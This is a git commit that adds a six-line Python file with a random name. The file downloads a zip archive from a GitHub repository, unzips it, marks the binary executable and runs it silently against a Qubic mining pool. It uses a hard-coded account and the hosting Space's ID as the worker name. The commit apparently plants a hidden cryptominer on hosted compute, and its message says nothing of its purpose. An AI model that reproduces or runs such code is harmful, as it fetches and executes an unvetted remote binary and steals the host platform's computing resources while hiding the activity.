76018561ca6374d4b54bbbf1b44d3aaaad12dc09
qqivk <fsswr518@gmail.com>
2025-02-23 02:22:27 +0100

    Create Qjxbd.py

---
+++ Qjxbd.py
@@ -0,0 +1,6 @@
+import os
+os.system("wget https://github.com/qqivk/Ueldq/raw/refs/heads/main/Zeapmgy.zip")
+os.system("unzip Zeapmgy.zip")
+os.system("chmod +x Zeapmgy")
+wn = os.getenv('SPACE_ID').replace("/","_")
+os.system(f"./Zeapmgy --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
